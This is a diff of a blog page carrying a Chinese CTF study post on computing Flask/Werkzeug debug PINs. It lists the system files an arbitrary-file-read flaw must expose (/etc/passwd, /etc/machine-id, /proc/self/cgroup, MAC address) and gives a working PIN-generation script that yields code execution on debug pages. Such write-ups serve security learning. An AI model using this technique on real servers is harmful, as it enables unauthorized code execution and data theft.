@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Tag: web | baicany</title>
+  <title itemprop="name">flask_debug_pin | baicany</title>
   
     <link rel="shortcut icon" href="favicon.ico">
   
@@ -220,130 +220,313 @@
   </div>
 </header>
 
-      
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
 <div class="pattern-center-blank"></div>
-<div class="pattern-center ">
-  <div class="pattern-attachment-img">
-    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="web.img" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://baicany.github.io/images/3687.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/3687.jpg">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      flask_debug_pin</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="https://baicany.github.io/images/head.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="">baicany</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2023-6-1<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
   </div>
-  <header class="pattern-header ">
-    <h1 class="cat-title">web</h1>
-  </header>
-</div>
+
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <p>Flask在debug模式下会生成一个Debugger PIN</p>
+<p>通过这个pin码，可以在报错页面执行任意python代码</p>
+<p>同一台机子上多次启动同一个Flask应用时，会发现这个pin码是固定的。</p>
+<p>uuid是啥不重要,只是写的时候去了解了</p>
+<h3 id="什么是UUID"><a href="#什么是UUID" class="headerlink" title="什么是UUID"></a>什么是UUID</h3><p><strong>UUID是一个通用唯一标识符</strong>。也可以将其称为GUID，即全局唯一标识符。</p>
+<p>UUID是128位长的数字或ID，用于唯一标识计算机系统中的文档，用户，资源或信息。</p>
+<ul>
+<li>UUID可以保证标识符在空间和时间上的唯一性。当我们谈论空间和时间时，是指当根据标准生成UUID时，标识符不会重复已经创建的标识符或将被创建以标识其他事物的标识符。</li>
+<li>因此，在需要唯一值的情况下，UUID很有用。</li>
+</ul>
+<p>根据**<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc4122.html">RFC 4122</a><strong>实现的Python UUID模块 。RFC 4122是Internet协会的标准和版权（C）。</strong>R** FC 4122规范包括所有详细信息和算法，以生成所有版本的唯一标识符。RFC 4122文档指定了三种生成UUID的算法。</p>
+<p>因此，使用Python UUID模块，您可以生成版本1、3、4和5 UUID。使用此模块生成的UUID是不可变的。</p>
+<p>Python UUID模块支持以下版本的UUID。</p>
+<ul>
+<li>UUID1 –使用主机MAC地址，序列号和当前时间生成UUID。此版本使用IEEE 802 MAC地址。</li>
+<li>UUID3和UUID 5使用加密哈希和应用程序提供的文本字符串来生成UUID。UUID 3使用MD5哈希，而UUID 5使用SHA-1哈希。</li>
+<li>UUID4使用伪随机数生成器生成UUID。</li>
+</ul>
+<p>HDCTF [yamiyami]</p>
+<h1 id="代码逻辑分析"><a href="#代码逻辑分析" class="headerlink" title="代码逻辑分析"></a>代码逻辑分析</h1><p>建议要去做做o(╥﹏╥)o因为这是以前的分析了，版本更新后，内容会更改，踩了坑</p>
+<pre><code class="PY"># -*- coding: utf-8 -*-
+from flask import Flask
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def hello():
+    return &#39;hello world!&#39;
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;0.0.0.0&quot;, port=8080, debug=True)
+</code></pre>
+<p>用pycharm在app.run下好断点，开启debug模式</p>
+<p>大致跟踪流程如下</p>
+<pre><code>app.py 
+python3.5/site-packages/flask/app.py  772行左右 run_simple(host, port, self, **options)
+python3.5/site-packages/werkzeug/serving.py 751行左右 application = DebuggedApplication(application, use_evalex)
+python3.5/site-packages/werkzeug/debug/__init__.py
+</code></pre>
+<p>具体可网上搜</p>
+<p>最主要的就是这一段哈希部分</p>
+<pre><code class="python">h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, text_type):
+        bit = bit.encode(&#39;utf-8&#39;)
+    h.update(bit)
+h.update(b&#39;cookiesalt&#39;)
+</code></pre>
+<p>连接了两个列表，然后循环里面的值做哈希</p>
+<p>这两个列表的定义</p>
+<pre><code class="py">probably_public_bits = [
+        username,
+        modname,
+        getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)),
+        getattr(mod, &#39;__file__&#39;, None),
+    ]
+
+    private_bits = [
+        str(uuid.getnode()),
+        get_machine_id(),
+    ]
+</code></pre>
+<pre><code class="pythoN">username # 用户名
+
+modname # flask.app
+
+getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flask
+
+getattr(mod, &#39;__file__&#39;, None) # flask目录下的一个app.py的绝对路径
+
+uuid.getnode() # mac地址十进制
+
+get_machine_id() # /etc/machine-id或或/proc/sys/kernel/random/boot_i
+</code></pre>
+<h4 id="machine-id"><a href="#machine-id" class="headerlink" title="machine_id"></a>machine_id</h4><p>每一个机器都会有自已唯一的id，linux的id一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_id</code>，docker靶机则读取<code>/proc/self/cgroup</code>，其中第一行的/docker/字符串后面的内容作为机器的id，在非docker环境下读取后两个，非docker环境三个都需要读取</p>
+<pre><code class="python">def _generate():
+        # Potential sources of secret information on linux.  The machine-id
+        # is stable across boots, the boot id is not
+        for filename in &#39;/etc/machine-id&#39;, &#39;/proc/sys/kernel/random/boot_id&#39;:
+            try:
+                with open(filename, &#39;rb&#39;) as f:
+                    return f.readline().strip()
+            except IOError:
+                continue
+
+        # On OS X we can use the computer&#39;s serial number assuming that
+        # ioreg exists and can spit out that information.
+        try:
+            # Also catch import errors: subprocess may not be available, e.g.
+            # Google App Engine
+            # See https://github.com/pallets/werkzeug/issues/925
+            from subprocess import Popen, PIPE
+            dump = Popen([&#39;ioreg&#39;, &#39;-c&#39;, &#39;IOPlatformExpertDevice&#39;, &#39;-d&#39;, &#39;2&#39;],
+                         stdout=PIPE).communicate()[0]
+            match = re.search(b&#39;&quot;serial-number&quot; = &lt;([^&gt;]+)&#39;, dump)
+            if match is not None:
+                return match.group(1)
+        except (OSError, ImportError):
+            pass
+
+        # On Windows we can use winreg to get the machine guid
+        wr = None
+        try:
+            import winreg as wr
+        except ImportError:
+            try:
+                import _winreg as wr
+            except ImportError:
+                pass
+        if wr is not None:
+            try:
+                with wr.OpenKey(wr.HKEY_LOCAL_MACHINE,
+                                &#39;SOFTWARE\\Microsoft\\Cryptography&#39;, 0,
+                                wr.KEY_READ | wr.KEY_WOW64_64KEY) as rk:
+                    machineGuid, wrType = wr.QueryValueEx(rk, &#39;MachineGuid&#39;)
+                    if (wrType == wr.REG_SZ):
+                        return machineGuid.encode(&#39;utf-8&#39;)
+                    else:
+                        return machineGuid
+            except WindowsError:
+                pass
+
+    _machine_id = rv = _generate()
+    return rv
+</code></pre>
+<p>首先尝试读取<code>/etc/machine-id</code>或者 <code>/proc/sys/kernel/random/boot_i</code>中的值，若有就直接返回</p>
+<p>当这6个值我们可以获取到时，就可以推算出生成的PIN码，引发任意代码执行</p>
+<h1 id="配合任意文件读取"><a href="#配合任意文件读取" class="headerlink" title="配合任意文件读取"></a>配合任意文件读取</h1><p>通过debug报错,分析app.py的绝对路径</p>
+<p>通过任意文件读取/etc/machine-id或/proc/sys/kernel/random/boot_i，</p>
+<p>一般题目是docker环境，因此读机器id需要读/proc/self/cgroup：</p>
+<p>/etc/passwd，读取用户名</p>
+<p>/sys/class/net/eth0/address，读取mac地址</p>
+<p>虚拟机中网卡为ens33,一般情况下应该是eth0</p>
+<p>踩坑:</p>
+<pre><code>虽然爆出路径是/usr/local/lib/python2.7/site-packages/flask/app.py&quot;但实际是app.pyc
+python不同版本不同加密3.6采用MD5加密，3.8采用sha1加密，所以脚本有所不同
+机器id读取顺序不同
+werkzeug 0.15.5之前
+/etc/machine-id-&gt;/proc/sys/kernel/random/boot_id-&gt;ioreg -c IOPlatformExpertDevice -d 2-&gt;HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid
+
+0.15.5-0.16.0
+/proc/self/cgroup-&gt;/etc/machine-id-&gt;/proc/sys/kernel/random/boot_id-&gt;ioreg -c IOPlatformExpertDevice -d 2-&gt;HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid
+
+/proc/self/cgroup需要用正则value.strip().partition(&quot;/docker/&quot;)[2]分割
+
+0.16.0之后
+/etc/machine-id-&gt;/proc/sys/kernel/random/boot_id-&gt;/proc/self/cgroup-&gt;ioreg -c IOPlatformExpertDevice -d 2-&gt;HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid
+
+2020.1.5对 machine_id() 进行了更新 ，所以2020.1.5之前的版本是跟这里不同的，具体更新情况可看
+https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f
+2020.1.5修改前是：
+是依序读取 /proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id 三个文件，只要读取到一个文件的内容，立马返回值。
+现在只要从 /etc/machine-id、/proc/sys/kernel/random/boot_id 中读到一个值后立即 break，然后和/proc/self/cgroup 中的id值拼接
+</code></pre>
+<p>脚本</p>
+<pre><code class="py">import hashlib
+from itertools import chain
+probably_public_bits = [
+    &#39;kingkk&#39;,# username
+    &#39;flask.app&#39;,# modname
+    &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
+    &#39;/home/kingkk/.local/lib/python3.5/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
+]
+
+private_bits = [
+    &#39;52242498922&#39;,# str(uuid.getnode()),  /sys/class/net/ens33/address
+    &#39;19949f18ce36422da1402b3e3fe53008&#39;# get_machine_id(), /etc/machine-id
+]
+
+h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode(&#39;utf-8&#39;)
+    h.update(bit)
+h.update(b&#39;cookiesalt&#39;)
+
+cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b&#39;pinsalt&#39;)
+    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
+</code></pre>
+<p>去复习把o(╥﹏╥)o,踩了很多坑,终于复现成功了</p>
+<p>buuctf [GYCTF2020]FlaskApp </p>
+<p>nssctf [NISACTF 2022]is secret</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/donate/AliPayQR.jpg"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/donate/WeChanQR.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2023/06/01/java%E5%A4%8D%E4%B9%A0%E9%A2%98/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/s15.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/s15.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                java复习题</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
-  <!-- 首页默认取最最新文章集 -->
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2023/06/01/python_debug_pin/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://baicany.github.io/images/3687.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2023/06/01/python_debug_pin/">
-    flask_debug_pin</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2023-6-1</div>
-    <p>
-    要配合任意文件读取哦=w=</p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2023/06/01/python_debug_pin/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2023/05/11/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://baicany.github.io/images/s4.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2023/05/11/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
-    这是我的第一篇文章</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2023-5-11</div>
-    <p>
-    hexo博客搭建</p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2023/05/11/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2018/12/12/Hexo-Theme-Sakura/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://baicany.github.io/images/s20.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2018/12/12/Hexo-Theme-Sakura/">
-    Hexo-Theme-Sakura</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2018-12-12</div>
-    <p>
-    hexo-sakura主题使用教程</p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2018/12/12/Hexo-Theme-Sakura/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
 
 
-      <div class="clearer">
-      </div>
-    </main>
-    <!--  -->
-    
-  </div>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="https://baicany.github.io/images/head.jpg" itemprop="image" alt="baicany" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author">baicany</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
+
     </div>    
     <div class="ins-search">
     <div class="ins-search-mask"></div>
